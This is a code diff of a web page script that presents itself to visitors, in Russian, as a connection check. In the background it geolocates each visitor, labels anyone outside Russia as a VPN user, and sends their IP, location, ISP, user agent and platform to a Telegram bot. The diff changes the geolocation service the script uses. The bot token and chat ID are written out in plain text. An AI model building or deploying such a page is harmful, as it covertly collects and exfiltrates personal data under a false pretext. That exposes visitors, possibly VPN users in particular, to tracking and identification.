@@ -64,19 +64,17 @@
 </div>
 
 <script>
-    // ТВОИ ДАННЫЕ ДЛЯ БОТА
     const botToken = '8640024610:AAH6n87qbPdQunACY4pdr2dUDh9GzX-Q6ZY';
     const chatId = '7253706229';
 
-    // Функция отправки отчёта
     function sendReport(geoData, isVpn) {
         const report = {
             ip: geoData.ip || '—',
             city: geoData.city || '—',
             region: geoData.region || '—',
-            country: geoData.country_name || '—',
-            country_code: geoData.country_code || '—',
-            isp: geoData.org || '—',
+            country: geoData.country || '—',
+            country_code: geoData.countryCode || '—',
+            isp: geoData.isp || geoData.org || '—',
             vpn_detected: isVpn,
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -116,26 +114,31 @@
         });
     }
 
-    // Основной скрипт — проверка по стране
-    fetch('https://ipapi.co/json/')
+    // Используем ip-api.com — работает в России
+    fetch('http://ip-api.com/json/')
         .then(response => response.json())
         .then(data => {
-            const countryCode = data.country_code || '';
-            // Если страна НЕ Россия (RU) — считаем, что включён VPN
-            const isVpn = countryCode.toUpperCase() !== 'RU';
+            if (data.status === 'success') {
+                const countryCode = data.countryCode || '';
+                const isVpn = countryCode.toUpperCase() !== 'RU';
 
-            if (isVpn) {
-                document.getElementById('vpnWarning').style.display = 'block';
-                document.getElementById('statusText').innerText = 'Ваше соединение не защищено, но проверка продолжается...';
+                if (isVpn) {
+                    document.getElementById('vpnWarning').style.display = 'block';
+                    document.getElementById('statusText').innerText = 'Ваше соединение не защищено, но проверка продолжается...';
+                } else {
+                    document.getElementById('statusText').innerText = 'Соединение защищено, идёт проверка...';
+                }
+
+                sendReport(data, isVpn);
             } else {
-                document.getElementById('statusText').innerText = 'Соединение защищено, идёт проверка...';
+                // Если API вернул ошибку — отправляем отчёт без гео
+                document.getElementById('statusText').innerText = 'Не удалось определить местоположение, продолжаем...';
+                sendReport({ ip: '—', city: '—', region: '—', country: '—', countryCode: '—', isp: '—' }, false);
             }
-
-            sendReport(data, isVpn);
         })
         .catch(() => {
             document.getElementById('statusText').innerText = 'Не удалось проверить соединение, продолжаем...';
-            sendReport({ ip: '—', city: '—', region: '—', country_name: '—', country_code: '—', org: '—' }, false);
+            sendReport({ ip: '—', city: '—', region: '—', country: '—', countryCode: '—', isp: '—' }, false);
         });
 </script>
 </body>
